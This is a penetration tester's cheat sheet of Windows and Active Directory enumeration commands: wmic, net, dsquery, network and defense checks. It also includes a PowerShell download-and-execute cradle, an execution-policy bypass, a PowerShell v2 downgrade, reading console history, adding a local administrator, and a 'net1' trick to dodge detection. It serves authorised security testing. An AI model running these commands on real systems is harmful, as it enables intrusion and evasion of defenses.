---
tags:
  - Authenticated
  - Local
  - OPSEC
  - AD
---
## OS Context
---
Basic enum commands

|   |   |
|---|---|
|**Command**|**Result**|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

```PowerShell
systeminfo
```
## Powershell
---
```PowerShell
Get-Module
```
```PowerShell
Get-ExecutionPolicy -List
```
```PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```
```PowerShell
Get-ChildItem Env: | ft Key,Value
```
```PowerShell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
```PowerShell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```
## OPSEC Techniques
---
```PowerShell
powershell.exe -version 2
```
### **Checking Defenses**
---
```PowerShell
netsh advfirewall show allprofiles
```
```PowerShell
sc query windefend
```
```PowerShell
Get-MpComputerStatus
```
### Other users on host?
---
```PowerShell
qwinsta
```
### **Network Information**
---
```PowerShell
arp -a
ipconfig /all
route print
```

!!! info "note"
	Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment.
### **Windows Management Instrumentation (WMI)**
---
```PowerShell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
```PowerShell
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```
```PowerShell
wmic process list /format:list
```
```PowerShell
wmic ntdomain list /format:list
```
```PowerShell
wmic useraccount list /format:list
```
```PowerShell
wmic group list /format:list
```
```PowerShell
wmic sysaccount list /format:list
```
[https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
## **Net Commands**
---
```PowerShell
net accounts
```
```PowerShell
net accounts /domain
```
```PowerShell
net group /domain
```
```PowerShell
net group "Domain Admins" /domain
```
```PowerShell
net group "domain computers" /domain
```
```PowerShell
net group "Domain Controllers" /domain
```
```PowerShell
net group <domain_group_name> /domain
```
```PowerShell
net groups /domain
```
List of domain groups
```PowerShell
net localgroup
```
```PowerShell
net localgroup administrators /domain
```
```PowerShell
net localgroup Administrators
```
```PowerShell
net localgroup administrators [username] /add
```
```PowerShell
net share
```
```PowerShell
net user <ACCOUNT_NAME> /domain
```
```PowerShell
net user /domain
```
```PowerShell
net user %username%
```
Information about the current user
```PowerShell
net use x: \computer\share
```
```PowerShell
net view
```
```PowerShell
net view /all /domain[:domainname]
```
```PowerShell
Shares on the domains
```
```PowerShell
net view /domain 
```


!!! info "OPSEC"
	Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
## **Dsquery**
---
```PowerShell
C:\Windows\System32\dsquery.dll
```

!!! info "note"
	Elevated privs required for dsquery



```PowerShell
dsquery user
```
```PowerShell
dsquery computer
```
We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.
```PowerShell
dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"
```
```PowerShell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
```PowerShell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```